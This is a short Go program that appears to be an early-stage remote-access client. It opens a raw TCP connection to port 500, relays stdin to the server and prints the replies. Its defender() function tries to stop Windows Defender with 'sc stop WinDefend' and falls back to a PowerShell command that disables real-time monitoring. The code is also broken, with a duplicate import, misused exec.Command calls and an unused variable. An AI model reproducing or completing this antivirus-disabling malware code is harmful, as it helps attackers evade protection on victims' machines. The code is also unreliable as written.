package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"fmt"
)

var connection net.Conn

func sendMessage() {
	for {
		fmt.Print(">> ")
		reader := bufio.NewReader(os.Stdin)
		textInput, _ := reader.ReadString('\n')
		textInput = strings.Replace(textInput, "\r", "", -1)
		textInput = strings.Replace(textInput, "\n", "", -1)
		if len(textInput) != 0 {
			connection.Write([]byte(textInput))
		}
	}
}

func defender() {
	c := exec.Command("sc stop WinDefend") // Tries to stop defender by using simple CMD command.

    if err := c.Run(); err != nil { 
        c := exec.Command("powershell -command Set-MpPreference -DisableRealtimeMonitoring $true") // tries the same trick but using powershell
    }   
}

func main() {

	conn, err := net.Dial("tcp", ":500")
	if err != nil {
		fmt.Println(err)
	}
	connection = conn
	go sendMessage()

	for {
		buf := make([]byte, 1024)
		size, err := conn.Read(buf)
		if err != nil {
			fmt.Println(err)
		}
		data := string(buf[:size])
		fmt.Println("Received From Server: " + data)

		/*
			reader := bufio.NewReader(os.Stdin)
			fmt.Print(">> ")
			text, _ := reader.ReadString('\n')
			fmt.Fprintf(conn, text+"\n")
			conn.Write([]byte(text))
			message, _ := bufio.NewReader(conn).ReadString('\n')
			fmt.Print("->: " + message)
			if strings.TrimSpace(string(text)) == "STOP" {
				fmt.Println("TCP client exiting...")
				return
			}
		*/
	}
}
